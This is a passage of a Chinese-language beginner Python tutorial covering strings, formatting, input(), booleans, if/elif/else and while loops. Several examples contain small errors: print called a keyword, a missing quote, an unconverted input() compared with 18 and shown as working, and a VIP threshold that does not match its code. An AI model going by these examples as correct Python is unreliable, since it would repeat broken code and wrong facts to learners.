bold;">不能是关键字</span><br></h2><p>比如<code>print</code>这种，是python自带的命令，我们不能将其设置为关键字<br><br>但如果设置为<code>Print</code>，python解释器会认为这是两个不同的标识符，不会报错，这也体现了python对标识符大小写敏感的特性</p><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><p>这个板块过于简单，附一张图自己看就好了<br><br><img src="https://free.picui.cn/free/2025/06/16/684fc67ec8063.png" alt="运算符"></p><h1 id="字符串-详细"><a href="#字符串-详细" class="headerlink" title="字符串[详细]"></a>字符串[详细]</h1><h2 id="字符串的三种定义方式"><a href="#字符串的三种定义方式" class="headerlink" title="字符串的三种定义方式"></a><span style="font-size: 24px; font-weight: bold;">字符串的三种定义方式</span><br></h2><p>被单引号<code>&#39;内容&#39;</code>、双引号<code>&quot;内容&quot;</code>或三引号<code>&quot;&quot;&quot;内容&quot;&quot;&quot;</code>包裹的文本数据<br><br>其中，单引号和双引号没有任何本质上的区别，将一行内容转化为字符串。但三引号可以将多行内容转换为字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;这是10&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;这也是10&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;这是三引号包裹的字符串</span></span><br><span class="line"><span class="string">可以写很多行&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这是10</span><br><span class="line">这也是10</span><br><span class="line">这是三引号包裹的字符串</span><br><span class="line">可以写很多行</span><br></pre></td></tr></table></figure><h2 id="字符串的引号嵌套"><a href="#字符串的引号嵌套" class="headerlink" title="字符串的引号嵌套"></a><span style="font-size: 24px; font-weight: bold;">字符串的引号嵌套</span><br></h2><p>假如我想将一句话转化为字符串，但是里面出现了引号，这该怎么办呢？<br><br><code>I&#39;m good in python</code>，<code>She says &quot;I am good in python&quot;</code>，<code>He says &quot;I&#39;m good in python&quot;</code><br><br>下面有几个解决方案<br></p><ul><li>针对<code>I&#39;m good in python</code>，不难发现句子里没有双引号，所以我们可以直接用双引号定义字符串</li><li>针对<code>She says &quot;I am good in python&quot;</code>，不难发现句子里有双引号，但是没有单引号，所以我们可以用单引号定义字符串</li><li>针对<code>He says &quot;I&#39;m good in python&quot;</code>，不难发现句子里既有双引号，又有单引号，所以我们可以用转转移字符<code>\</code>来辅助定义字符串</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I&#x27;m good in python&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;She says &quot;I am good in python&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;He says \&quot;I\&#x27;m good in python\&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>其中，方案三泛用性最强</p><h2 id="字符串的拼接"><a href="#字符串的拼接" class="headerlink" title="字符串的拼接"></a><span style="font-size: 24px; font-weight: bold;">字符串的拼接</span><br></h2><p>现在，我有两个字符串，分别是<code>&quot;我是&quot;</code>和<code>&quot;Python高手&quot;</code>，那该怎么将他们拼接起来呢？<br><br>很简单，用<code>+</code>即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&quot;我是&quot;</span></span><br><span class="line">b = <span class="string">&quot;Python高手&quot;</span></span><br><span class="line"><span class="built_in">print</span>(a+b)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我说：&quot;</span>,a+b)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我是Python高手</span><br><span class="line">我说： 我是Python高手</span><br></pre></td></tr></table></figure><blockquote><p>但要注意！Python中，字符串只能和字符串拼接，不可以和其他类型拼接！</p></blockquote><h2 id="字符串格式化"><a href="#字符串格式化" class="headerlink" title="字符串格式化"></a><span style="font-size: 24px; font-weight: bold;">字符串格式化</span><br></h2><p>上面讲到了字符串的拼接，但是这个时候我们会发现：</p><ul><li>如果要拼接比较长的一句话，要写很多加号，不优雅</li><li>不能和其他类型拼接，不好使</li></ul><p>那有没有什么好的办法呢？<br><br>答案是有的，这就是字符串格式化<br><br>字符串格式化，先在一个字符串内，用<code>%s</code>来表示一个字符串占位符，然后用<code>%</code>后面的参数来代替占位符<br><br>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&quot;我是&quot;</span></span><br><span class="line">b = <span class="string">&quot;Python高手&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%s是Python高手&quot;</span> % a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我说：%s%s&quot;</span> % (a,b))</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我是Python高手</span><br><span class="line">我说：我是Python高手</span><br></pre></td></tr></table></figure><p>字符串格式化，究其本质，就是将<code>%</code>后面的内容格式化为字符串，并插入预留好的<code>%s</code>处<br><br>这时，我们惊喜的发现，整数、浮点数等不是字符串格式的，也可以用字符串格式化的方法来格式化<br><br>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我说：我有%d元&quot;</span> % a)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我说：我有10元</span><br></pre></td></tr></table></figure><p>但是整数、浮点数这种别的类型，都被转换成了字符串，好用是好用，但是没了原来的味道<br><br>其实，还是有别的方法的：<br><img src="https://free.picui.cn/free/2025/06/16/684fd0efef061.png" alt="格式表"><br>解释一下：</p><ul><li><code>%s</code>：表示字符串占位符 s &#x3D; string</li><li><code>%d</code>：表示整数占位符   d &#x3D; int</li><li><code>%f</code>：表示浮点数占位符 f &#x3D; float</li></ul><p>🌟 <strong>关键区别总结</strong></p><table><thead><tr><th>占位符</th><th>接受类型</th><th>小数处理</th><th>精度控制</th><th>非数字兼容性</th></tr></thead><tbody><tr><td><code>%s</code></td><td><strong>任意类型</strong></td><td>原样输出</td><td>❌不支持</td><td>✅ 自动转换</td></tr><tr><td><code>%d</code></td><td><strong>仅整数</strong></td><td>丢弃小数（非四舍五入）</td><td>❌不支持</td><td>❌ 报错</td></tr><tr><td><code>%f</code></td><td><strong>数字类型</strong></td><td>保留小数</td><td>✅ 支持（默认保留 6 位小数）</td><td>❌ 报错</td></tr></tbody></table><h3 id="字符串格式化的精度控制"><a href="#字符串格式化的精度控制" class="headerlink" title="字符串格式化的精度控制"></a><span style="font-size: 24px; font-weight: bold;">字符串格式化的精度控制</span><br></h3><p>我们可以使用辅助符号<code>&quot;m.n&quot;</code>来控制数据的宽度和精度<br></p><ul><li><code>m</code>，控制宽度，要求是数字(很少使用),设置的宽度小于数字自身，不生效<br><br>示例：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%5d&quot;</span> % a)</span><br></pre></td></tr></table></figure>输出<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[空格][空格][空格]10        #将不足5位的数字，用空格补齐到5位</span><br></pre></td></tr></table></figure></li><li><code>.n</code>，控制小数点精度，要求是数字，会进行小数的四舍五入<br><br>示例：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">10.45678</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%.2f&quot;</span> % a)</span><br></pre></td></tr></table></figure>输出<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.46               #将小数点后保留2位，进行四舍五入，不足5位，前面补空格</span><br></pre></td></tr></table></figure></li></ul><p>结合<code>m.n</code>，即控制长度，又控制精度<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">10.45678</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%5.2f&quot;</span> % a)</span><br></pre></td></tr></table></figure><br>  输出<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[空格]10.46               #将小数点后保留2位，进行四舍五入，不足5位，前面补空格</span><br></pre></td></tr></table></figure></p><h3 id="字符串的快速格式化"><a href="#字符串的快速格式化" class="headerlink" title="字符串的快速格式化"></a><span style="font-size: 24px; font-weight: bold;">字符串的快速格式化</span><br></h3><p>目前通过%符号占位已经很方便了，还能进行精度控制。<br><br>可是追求效率和优雅的Python，是否有更加优雅的方式解决问题呢?<br><br>那当然！<br><br>通过语法:<code>f&quot;内容&#123;变量&#125;&quot;</code>的格式来快速格式化<br></p><blockquote><p>用人话来说：<br><br><code>f</code>告诉编译器：后面这个字符串里有需要被格式化的变量<br><br><code>&#123;&#125;</code>是占位符，<br><br><code>&#123;&#125;</code>里的内容就是需要被格式化的变量，<br><br>编译器收到<code>f</code>的通知后，会自动将<code>&#123;&#125;</code>里的内容提取出来，替换掉<code>&#123;&#125;</code><br></p></blockquote><p>看如下代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">10.5</span></span><br><span class="line">b = <span class="string">&quot;Python&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;我有<span class="subst">&#123;a&#125;</span>元，我是<span class="subst">&#123;b&#125;</span>高手&quot;</span>)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我有10.5元，我是Python高手</span><br></pre></td></tr></table></figure><p>wow，果然比<code>%</code>符号占位要快！优雅、优雅、优雅！<br><br>同时，对浮点数不做精度限制，直接按原样输出了<code>10.5</code>，而非<code>%f</code>后应该输出的<code>10.500000</code></p><h2 id="对表达式进行格式化"><a href="#对表达式进行格式化" class="headerlink" title="对表达式进行格式化"></a>对表达式进行格式化</h2><p>表达式：一条具有明确执行结果的代码语句<br><br>例如：<code>&quot;Jack&quot;</code>，<code>1 + 1</code>，<code>0</code>这种固定值，或是<code>a = 1 + 1</code>的等号右边的部分<br><br>对于字符串的格式化，同样的可以格式化表达式<br><br>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="number">1</span> + <span class="number">1</span>&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">type</span>(<span class="string">&quot;Jack&quot;</span>)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2</span><br><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br></pre></td></tr></table></figure><p>在无需使用变量进行数据存储的时候，可以直接格式化表达式，简化代码</p><h1 id="数据输入-input（）"><a href="#数据输入-input（）" class="headerlink" title="数据输入 input（）"></a>数据输入 input（）</h1><p>我们之前学习了<code>print()</code>函数，将所需的东西打印到屏幕上。那么，怎么和用户建立联系，让用户来向我输入东西呢？<br><br>答案是，使用<code>input()</code>函数！<br><br><code>input()</code>函数在使用时，往往长得像下面这样：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">input</span>(<span class="string">&quot;请输入：&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p><span style="color:red">一定要注意！！！<code>input()</code>函数的默认输出类型是<code>string</code>！！！</span><br></p><blockquote><p>此时，若想将输入进来的字符，转换为整数或浮点数，就需要用到<code>int()</code>或<code>float()</code>函数了<span id="custom-spot"></span><br><a href="#%E5%AD%97%E9%9D%A2%E9%87%8F">[转跳前文]</a></p><blockquote><p>例如：<code>a = int(input(&quot;请输入：&quot;))</code><br>这样，输入的字符就会被转换为整数类型，储存在变量<code>a</code>中</p></blockquote></blockquote></blockquote><h1 id="布尔类型和比较运算符"><a href="#布尔类型和比较运算符" class="headerlink" title="布尔类型和比较运算符"></a>布尔类型和比较运算符</h1><h2 id="布尔类型"><a href="#布尔类型" class="headerlink" title="布尔类型"></a><span style="font-size: 24px; font-weight: bold;">布尔类型</span><br></h2><p>布尔<code>bool</code>表示现实生活中的逻辑真假<br></p><ul><li>真（True）：1</li><li>假（False）：0<blockquote><p>如果你学过离散数学，这一块应该比较清楚，但是零基础也不难理解</p></blockquote></li></ul><p>我们可以用一个变量来接收布尔值，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">10</span> &gt; <span class="number">5</span>    <span class="comment">#将 10 &gt; 5 进行判断，并将结果赋值到a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;10 &gt; 5 是<span class="subst">&#123;a&#125;</span>，变量a包含的内容的类型是<span class="subst">&#123;<span class="built_in">type</span>(a)&#125;</span>&quot;</span>)  <span class="comment">#输出a的赋值，检查a的类型</span></span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10 &gt; 5 是True，变量a包含的内容的类型是&lt;class &#x27;bool&#x27;&gt;</span><br></pre></td></tr></table></figure><h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a><span style="font-size: 24px; font-weight: bold;">比较运算符</span><br></h2><p>下面是基本的比较运算符一图通：<br><img src="https://free.picui.cn/free/2025/06/16/6850340ee82bf.png" alt="比较运算符一图通"><br>比较简单，看看就会了</p><h1 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a><span style="font-size: 30px; font-weight: bold;">if语句</span><br></h1><h2 id="if语句的基本格式"><a href="#if语句的基本格式" class="headerlink" title="if语句的基本格式"></a><span style="font-size: 24px; font-weight: bold;">if语句的基本格式</span><br></h2><p>基本格式如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件:</span><br><span class="line">    代码块</span><br></pre></td></tr></table></figure><p>if语句的意思是：如果if后的条件成立，就执行代码块</p><blockquote><p><span style="color:red">注意:python中判断代码块归属权看缩进，而不像C&#x2F;C++看花括号<code>&#123;&#125;</code></span><br><br>示例如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">input</span>(<span class="string">&quot;你多大了？&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> a &gt;= <span class="number">18</span>:</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;你成年了&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;时间过得真快啊&quot;</span>)</span><br></pre></td></tr></table></figure><p>如果<code>a&gt;=18</code>，将输出如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">你成年了</span><br><span class="line">时间过得真快啊</span><br></pre></td></tr></table></figure><p>如果<code>a&lt;18</code>，将输出如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">时间过得真快啊</span><br></pre></td></tr></table></figure><p>这里可以明显看到，<code>print(&quot;你成年了&quot;)</code>是受<code>if</code>判断输出。而<code>print(&quot;时间过得真快啊&quot;)</code>不受<code>if</code>判断的影响，无论<code>a</code>是否大于<code>18</code>，都输出。<br><br>这里可以看出：<span style="color:red">缩进相同的代码，运行等级也相同</span></p></blockquote><h2 id="if-else语句"><a href="#if-else语句" class="headerlink" title="if else语句"></a><span style="font-size: 24px; font-weight: bold;">if else语句</span><br></h2><p>基本格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件:</span><br><span class="line">    代码块<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    代码块<span class="number">2</span></span><br></pre></td></tr></table></figure><p>意思是：</p><ul><li>如果<code>if</code>条件成立，执行<code>代码块1</code></li><li>如果<code>if</code>条件不成立，执行<code>代码块2</code><blockquote><p><span style="color:red">注意：<code>if</code>和<code>else</code>的等级相同，缩进必须相同</span></p></blockquote></li></ul><h3 id="代码实践"><a href="#代码实践" class="headerlink" title="代码实践"></a>代码实践</h3><p>写一个“我要买票吗？”的程序，要求如下：</p><ul><li>18岁以下免票</li><li>18岁及18岁以上需要买票</li></ul><details><summary>代码示例</summary><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">age = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入你的年龄：&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> age &gt;= <span class="number">18</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你可需要买票了&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你未成年，不需要买票&quot;</span>)</span><br></pre></td></tr></table></figure></details><h2 id="if-elif-else语句"><a href="#if-elif-else语句" class="headerlink" title="if elif else语句"></a><span style="font-size: 24px; font-weight: bold;">if elif else语句</span><br></h2><p>基本格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件<span class="number">1</span>:</span><br><span class="line">    代码块<span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> 条件<span class="number">2</span>:</span><br><span class="line">    代码块<span class="number">2</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    代码块<span class="number">3</span></span><br></pre></td></tr></table></figure><p>意思是：</p><ul><li>如果<code>if</code>条件1成立，执行<code>代码块1</code></li><li>如果<code>if</code>条件1不成立，执行<code>elif</code>后的条件2</li><li>如果<code>elif</code>后的条件2成立，执行<code>代码块2</code></li><li>如果<code>elif</code>后的条件2不成立，执行<code>else</code>后的代码块3</li></ul><p>执行第<code>n</code>个代码块的要求是：</p><ul><li>前<code>n-1</code>个代码块的条件都不成立</li><li>第<code>n</code>个代码块的条件成立</li></ul><blockquote><p><code>elif</code>可以有多个，但是<code>else</code>只能有一个<br></p></blockquote><h2 id="代码实践-1"><a href="#代码实践-1" class="headerlink" title="代码实践"></a><span style="font-size: 24px; font-weight: bold;">代码实践</span><br></h2><p>写一个“猜数字”的程序，要求如下：</p><ul><li>由系统设置猜数的值为<code>10</code></li><li>玩家有3次机会猜数字</li><li>猜对了，提示<code>“你猜对了”</code></li><li>猜错了，则进行下一次猜测</li><li>玩家3次都猜错了，提示<code>“很遗憾，没有猜对”</code>，并告知玩家系统设置的数值</li></ul><details><summary>代码示例</summary><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置一个猜想数字</span></span><br><span class="line">a = <span class="number">10</span></span><br><span class="line"><span class="comment">#让用户进行猜想并判断</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;猜一个数：&quot;</span>))==a:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;第一次就猜对了！&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;猜一个数：&quot;</span>))==a:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你猜对了！&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;最后一次机会，猜一个数：&quot;</span>))==a:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你猜对了！&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;很遗憾，没有猜对，我想的数是：<span class="subst">&#123;a&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></details><h2 id="判断语句的嵌套"><a href="#判断语句的嵌套" class="headerlink" title="判断语句的嵌套"></a><span style="font-size: 24px; font-weight: bold;">判断语句的嵌套</span><br></h2><p>在生活中，我们不仅能碰到这种：<code>如果……就，否则如果……就，否则</code>的情况，更多的可能是分支结构，如下图<br><br><img src="https://free.picui.cn/free/2025/06/17/6850cb872ef3d.png" alt="判断语句的嵌套"><br>想写成上面的样子，格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件<span class="number">1</span>:</span><br><span class="line">    代码块<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> 条件<span class="number">1.1</span>:</span><br><span class="line">      执行<span class="number">1.1</span><span class="number">.1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      执行<span class="number">1.1</span><span class="number">.2</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    代码块<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> 条件<span class="number">2.1</span>:</span><br><span class="line">      执行<span class="number">2.1</span><span class="number">.1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      执行<span class="number">2.1</span><span class="number">.2</span></span><br></pre></td></tr></table></figure><p>这里我们可以清楚地看出，程序先对<code>条件1</code>进行判断，再执行第二层嵌套的<code>if-else</code></p><h2 id="代码实践-2"><a href="#代码实践-2" class="headerlink" title="代码实践"></a><span style="font-size: 24px; font-weight: bold;">代码实践</span><br></h2><p>写一个“游乐园购票”的程序，要求如下：</p><ul><li>18岁以下免票，18岁以上票价10元</li><li>VIP等级&gt;3的，免票入园</li><li>优先判断年龄，再判断VIP等级</li></ul><details><summary>代码示例</summary><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#让用户输入自己的年龄</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;今年多大了：&quot;</span>))&gt;=<span class="number">18</span>:</span><br><span class="line">    <span class="comment">#让用户输入自己的VIP等级</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;你的VIP等级是：&quot;</span>))&gt;=<span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;你可以免票入园&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;你需要买票，请支付10元&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你可以免票入园&quot;</span>)</span><br></pre></td></tr></table></figure></details><h1 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a><span style="font-size: 30px; font-weight: bold;">while循环</span><br></h1><p>循环，顾名思义，就是程序一直绕圈，走重复的路，如下图：<br><img src="https://free.picui.cn/free/2025/06/17/6850d23a1f4ed.png" alt="循环示意图"><br>意思是：如果<code>条件</code>成立，就执行<code>代码块</code>，执行完<code>代码块</code>后，再次判断<code>条件</code>，如果<code>条件</code>成立，就再次执行<code>代码块</code>，直到<code>条件</code>不成立，循环结束</p><h2 id="基础应用"><a href="#基础应用" class="headerlink" title="基础应用"></a><span style="font-size: 24px; font-weight: bold;">基础应用</span><br></h2><p>基本格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> 条件:</span><br><span class="line">    代码块</span><br></pre></td></tr></table></figure><p>这么写可能不是很清晰，下面是一个代码示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置一个变量</span></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line"><span class="comment">#循环</span></span><br><span class="line"><span class="keyword">while</span> a &lt;= <span class="number">5</span>:</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line">    a = a + <span class="number">1</span></span><br></pre></td></tr></table></figure><blockquote><p>意思是：<span style="color:red">如果<code>a&lt;=5</code>，就执行<code>print(a)</code>和<code>a = a + 1</code>，执行完后，再次判断<code>a&lt;=5</code>，如果成立，就再次执行<code>print(a)</code>和<code>a = a + 1</code>，直到<code>a&gt;5</code>，循环结束</span></p></blockquote><p>所以输出的结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td></tr></table></figure><h2 id="代码实践-3"><a href="#代码实践-3" class="headerlink" title="代码实践"></a><span style="font-size: 24px; font-weight: bold;">代码实践</span><br></h2><p>写一个“1-100的累加”的程序，要求如下：</p><ul><li>计算1-100的累加和</li><li>用<code>while</code>循环实现</li></ul><details><summary>代码示例</summary><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置一个变量</span></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line"><span class="comment">#设置一个累加和</span></span><br><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="comment">#循环</span></span><br><span class="line"><span class="keyword">while</span> a &lt;= <span class="number">100</span>:</span><br><span class="line">    <span class="built_in">sum</span> = <span class="built_in">sum</span> + a</span><br><span class="line">    a = a + <span class="number">1</span></span><br><span class="line"><span class="comment">#输出累加和</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure></details><h2 id="嵌套应用"><a href="#嵌套应用" class="headerlink" title="嵌套应用"></a><span style="font-size: 24px; font-weight: bold;">嵌套应用</span><br></h2><p>循环语句的嵌套，本质上和判断语句的嵌套是一样的，如下图：<br><br><img src="https://free.picui.cn/free/2025/06/17/6850d6f556d04.png" alt="循环语句的嵌套"><br><br>程序会在执行第一个循环后，进入第二个循环，直到从第二个循环中离开，才会继续执行第一个循环<br><br>示例程序如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置一个变量</span></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line"><span class="comment">#循环</span></span><br><span class="line"><span class="keyword">while</span> a 